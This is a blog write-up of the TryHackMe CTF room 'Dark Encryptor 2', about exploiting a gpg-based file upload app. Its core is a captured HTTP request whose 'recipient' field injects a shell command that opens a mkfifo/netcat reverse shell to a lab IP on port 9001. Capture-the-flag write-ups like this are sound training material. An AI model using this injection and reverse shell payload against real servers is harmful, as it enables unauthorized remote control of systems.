---
title: TryHackMe Dark Encryptor 2 Hackfinity Battle Write-Up Walk Through
date: 2025-03-25 06:00:00 +0200
categories: [TryHackMe, CTF,Hackfinity Battle, TryHackMe Write Up]
tags: [file-upload, command-injection, gpg, hacking, Hackfinity, ctf]
description: "After pivoting through their internal network, we have found yet another encryption tool. Can you hack into the server and extract the secret data? Our intel tells us that the app is using the gpg tool. "
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-dark-encryptor-2.png
  alt: TryHackMe Dark Encryptor 2 Hackfinity Battle
---

# Exploring TryHackMe's Dark Encryptor 2: A File Upload Adventure

Recently, I tackled the "Dark Encryptor 2" room on TryHackMe, and it was a blast! This challenge dives into a file upload scenario where you’re tasked with outsmarting an application that encrypts your files using GPG. What starts as a simple upload turns into a hunt for a cleverly hidden vulnerability—one that ties back to lessons from its predecessor room.

**[You can follow YouTube video walk through here](https://youtu.be/wm6yWq3IHl4)**

## The Setup
The room presents an app with a file upload feature, complete with an extension filter and an encryption type dropdown. Upload a file like `test.txt`, and you get back an encrypted version (e.g., `random_name.gpg`). The catch? There’s a way to make the app spill its secrets—specifically, the flag—by exploiting how it handles your input.

## The Twist

You can also get reverse shell, bellow Burp suite setup

```console
POST / HTTP/1.1
Host: 10.10.205.208:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------8260033711009175319198161817
Content-Length: 422
Origin: http://10.10.205.208:5000
Connection: keep-alive
Referer: http://10.10.205.208:5000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------8260033711009175319198161817
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test

-----------------------------8260033711009175319198161817
Content-Disposition: form-data; name="recipient"


Cipher ;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.248.189 9001 >/tmp/f)
-----------------------------8260033711009175319198161817--

```
# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/wm6yWq3IHl4)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/wm6yWq3IHl4)**

<img src="tryhackme-dark-encryptor-2-youtube-video.png"  alt="TryHackMe Dark Encryptor 2 YouTube Video Walk through" >


